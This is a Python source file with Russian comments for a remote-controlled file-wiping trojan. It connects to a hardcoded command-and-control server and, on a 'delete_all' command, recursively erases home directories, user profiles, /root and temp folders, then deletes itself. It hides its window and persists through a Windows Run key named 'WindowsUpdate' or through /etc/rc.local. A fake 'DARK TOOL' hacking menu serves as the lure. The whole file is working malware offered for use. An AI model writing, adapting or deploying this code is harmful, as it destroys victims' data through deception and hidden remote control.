# Mo.dark готов 🕷️☠️
# КЛИЕНТ - Бесшумный уничтожитель файлов

import socket
import json
import os
import sys
import shutil
import threading
import platform
import time

class SilentDestroyer:
    def __init__(self, server_host, server_port=5555):
        self.server_host = server_host
        self.server_port = server_port
        self.running = True
        
    def connect(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.server_host, self.server_port))
                print(f"[+] Подключено к C2: {self.server_host}:{self.server_port}")
                self.listen(sock)
            except:
                time.sleep(10)
                
    def listen(self, sock):
        while self.running:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                command = json.loads(data.decode())
                if command.get("action") == "delete_all":
                    self.nuclear_delete()
                    sock.send(json.dumps({"status": "deleted", "system": platform.system()}).encode())
            except:
                pass
                
    def nuclear_delete(self):
        """УДАЛИТЬ ВСЕ ФАЙЛЫ - АВТОМАТИЧЕСКИ, БЕЗ ОЖИДАНИЯ"""
        system = platform.system()
        
        if system == "Windows":
            targets = [
                os.environ.get('USERPROFILE', 'C:\\Users\\Default'),
                os.environ.get('APPDATA', ''),
                os.environ.get('LOCALAPPDATA', ''),
                'C:\\Windows\\Temp',
                'C:\\Windows\\Prefetch'
            ]
        elif system == "Linux":
            targets = [
                os.path.expanduser("~"),
                "/tmp",
                "/var/tmp",
                "/home",
                "/root"
            ]
        else:
            targets = [
                os.path.expanduser("~"),
                "/tmp"
            ]
            
        for target in targets:
            if os.path.exists(target):
                self.force_delete(target)
                
        try:
            os.remove(sys.argv[0])
        except:
            pass
            
    def force_delete(self, path):
        try:
            if os.path.isfile(path):
                os.remove(path)
            elif os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
        except:
            pass
            
    def hide_window(self):
        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            
    def add_persistence(self):
        system = platform.system()
        
        if system == "Windows":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + " " + sys.argv[0])
        elif system == "Linux":
            rc_local = "/etc/rc.local"
            if os.path.exists(rc_local):
                with open(rc_local, 'a') as f:
                    f.write(f"\npython3 {sys.argv[0]} &\n")
                    
    def fake_menu(self):
        self.clear_screen()
        print("="*50)
        print("    ☠️  DARK TOOL v7.0  ☠️")
        print("    ВЫБЕРИТЕ ЦЕЛЬ:")
        print("="*50)
        print("[1] Взломать телефон")
        print("[2] Взломать компьютер")
        print("[3] Взломать IoT устройство")
        print("[4] Войти в тёмную сеть")
        print("="*50)
        
        choice = input("\n[>] Выбор: ")
        
        print("\n[!] Подготовка окружения...")
        time.sleep(2)
        print("[!] Ошибка подключения")
        print("[!] Попробуйте позже")
        time.sleep(2)
        self.hide_window()
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def start(self):
        self.hide_window()
        threading.Thread(target=self.fake_menu, daemon=True).start()
        self.connect()
        
if __name__ == "__main__":
    SERVER_IP = "192.168.1.100"
    destroyer = SilentDestroyer(SERVER_IP)
    destroyer.add_persistence()
    destroyer.start()